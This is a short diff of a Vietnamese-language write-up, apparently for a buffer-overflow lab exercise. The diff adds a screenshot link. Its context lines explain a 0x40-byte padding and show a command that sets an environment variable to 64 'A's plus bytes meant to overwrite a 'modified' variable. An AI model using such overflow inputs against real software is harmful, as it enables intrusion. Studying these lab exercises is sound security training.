@@ -17,3 +17,5 @@ biến `modified` ở sau `buf`, nên phần `padding: 0x58-0x18 = 0x40`. bây g
 
 `export GREENIE= $(python -c ‘print “A”*64 + “\x0a\x0d\x0a\x0d”')`
 
+![run](run.png)
+
